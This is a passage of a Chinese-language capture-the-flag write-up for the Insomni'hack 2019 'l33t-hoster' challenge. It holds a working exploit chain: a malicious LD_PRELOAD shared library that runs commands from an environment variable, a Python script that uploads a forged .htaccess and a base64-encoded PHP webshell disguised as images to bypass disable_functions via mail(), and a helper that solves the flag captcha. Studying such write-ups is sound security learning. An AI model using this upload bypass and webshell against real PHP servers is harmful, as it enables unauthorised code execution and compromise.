+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">char</span> *cmd)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, cmd);</span><br><span class="line">  <span class="built_in">strcat</span>(buf, <span class="string">&quot; &gt; /tmp/_0utput.txt&quot;</span>);</span><br><span class="line">  system(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *cmd;</span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">  unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((cmd = getenv(<span class="string">&quot;_evilcmd&quot;</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    payload(cmd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述代码将从环境变量_evilcmd 中执行命令，结果重定向到 /tmp/_0utput.txt 中，那么 shell.tiaonmmn 需要完成的就是 putenv LD_PRELOAD 和_evilcmd，调用 mail () 函数，最后读 /tmp/_0utput.txt 文件。我们的 Python 脚本要更新一下了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">VALID_WBMP = <span class="string">b&quot;\x00\x00\x8a\x39\x8a\x39\x0a&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://35.246.234.136/&quot;</span></span><br><span class="line">RANDOM_DIRECTORY = <span class="string">&quot;ad759ad95e5482e02a15c5d30042b588b6630e64&quot;</span></span><br><span class="line"></span><br><span class="line">COOKIES = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span> : <span class="string">&quot;0e7eal0ji7seg6ac3ck7d2csd8&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_content</span>(<span class="params">name, content</span>):</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;image&quot;</span> : (name, content, <span class="string">&#x27;image/png&#x27;</span>),</span><br><span class="line">        <span class="string">&quot;upload&quot;</span> : (<span class="literal">None</span>, <span class="string">&quot;Submit Query&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    response = requests.post(URL, files=data, cookies=COOKIES)</span><br><span class="line"></span><br><span class="line">HT_ACCESS = VALID_WBMP + <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .corb3nik</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">TARGET_FILE = VALID_WBMP + <span class="string">b&quot;AA&quot;</span> + base64.b64encode(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">move_uploaded_file($_FILES[&#x27;evil&#x27;][&#x27;tmp_name&#x27;], &#x27;/tmp/evil.so&#x27;);</span></span><br><span class="line"><span class="string">putenv(&#x27;LD_PRELOAD=/tmp/evil.so&#x27;);</span></span><br><span class="line"><span class="string">putenv(&quot;_evilcmd=uname -a&quot;);</span></span><br><span class="line"><span class="string">mail(&#x27;a&#x27;,&#x27;a&#x27;,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">echo file_get_contents(&#x27;/tmp/_0utput.txt&#x27;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">upload_content(<span class="string">&quot;..htaccess&quot;</span>, HT_ACCESS)</span><br><span class="line">upload_content(<span class="string">&quot;shell.corb3nik&quot;</span>, TARGET_FILE)</span><br><span class="line">upload_content(<span class="string">&quot;trigger.corb3nik&quot;</span>, VALID_WBMP)</span><br><span class="line"></span><br><span class="line">files = &#123; <span class="string">&quot;evil&quot;</span> : open(<span class="string">&quot;../payloads/evil.so&quot;</span>, <span class="string">&quot;rb&quot;</span>) &#125;</span><br><span class="line">response = requests.post(URL + <span class="string">&quot;/images/&quot;</span> + RANDOM_DIRECTORY + <span class="string">&quot;/trigger.corb3nik&quot;</span>, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们尝试执行一下 get_flag 命令：</p>
+<img src="/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/get_flag.png" class="" title="Get Flag?">
+<p>啊，看来还没有结束。</p>
+<h1 id="part-3.-get-the-fking-flag">Part 3. Get the f**king flag</h1>
+<p>  把 get_flag 下载到本地，IDA 分析发现这个程序随机生成数字，要求在 1s 内给出答案，否则程序退出。那么，同样的思路，不过 so 库文件要完成一系列的操作了。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> inpipefd[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> outpipefd[<span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">        pipe(inpipefd);</span><br><span class="line">        pipe(outpipefd);</span><br><span class="line">        pid = fork();</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">                dup2(outpipefd[<span class="number">0</span>], STDIN_FILENO);</span><br><span class="line">                dup2(inpipefd[<span class="number">1</span>], STDOUT_FILENO);</span><br><span class="line">                dup2(inpipefd[<span class="number">1</span>], STDERR_FILENO);</span><br><span class="line">                prctl(PR_SET_PDEATHSIG, SIGTERM);</span><br><span class="line">                execl(<span class="string">&quot;/get_flag&quot;</span>, <span class="string">&quot;get_flag&quot;</span>, (<span class="keyword">char</span>*) <span class="literal">NULL</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">close</span>(outpipefd[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">close</span>(inpipefd[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">char</span> data[<span class="number">0xff</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Read first line</span></span><br><span class="line">        <span class="keyword">for</span> (; data[<span class="number">0</span>] != <span class="string">&#x27;\n&#x27;</span>; <span class="built_in">read</span>(inpipefd[<span class="number">0</span>], data, <span class="number">1</span>));</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Read captcha</span></span><br><span class="line">        <span class="built_in">read</span>(inpipefd[<span class="number">0</span>], data, <span class="number">0xff</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">uint64_t</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span> *pch;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Raw : %s\n&quot;</span>, data);</span><br><span class="line">        pch = strtok (data, <span class="string">&quot;+&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sum : %lu\n&quot;</span>, sum);</span><br><span class="line">        <span class="keyword">while</span> (pch != <span class="number">0</span>)  &#123;</span><br><span class="line">                sum += strtoull(pch, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Operand : %lu\n&quot;</span>, atol(pch));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Sum : %lu\n&quot;</span>, sum);</span><br><span class="line">                pch = strtok (<span class="number">0</span>, <span class="string">&quot;+&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">char</span> result[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">sprintf</span>(result, <span class="string">&quot;%lu\n&quot;</span>, sum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Result : %lu\n&quot;</span>, sum);</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">write</span>(outpipefd[<span class="number">1</span>], result, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">read</span>(inpipefd[<span class="number">0</span>], data, <span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Final : %s&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将文件编译完，上传，_evilcmd 执行后，得到结果。最终得到 flag。</p>
+
+    <div id="aplayer-csqWtlXn" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="21974794" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{67901b58-bd98-4494-b502-df1434c9a6ba}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Tiaonmmn.ZMZ
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/" title="Insomni-hack-teaser-2019-l33-hoster">http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nd/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/Upload/" rel="tag"><i class="fa fa-tag"></i> Upload</a>
+              <a href="/tags/LD-PRELOAD/" rel="tag"><i class="fa fa-tag"></i> LD_PRELOAD</a>
+              <a href="/tags/disable-functions/" rel="tag"><i class="fa fa-tag"></i> disable_functions</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/05/15/MeePwn2018-PyCalX-1-2/" rel="prev" title="MeePwn2018-PyCalX 1-2">
+                  <i class="fa fa-chevron-left"></i> MeePwn2018-PyCalX 1-2
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/06/12/flag-thats-it/" rel="next" title="flag{thats_it}">
+                  flag{thats_it} <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">296k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:29</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  const url = element.dataset.target;
+  const pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+<script>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/",
+    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
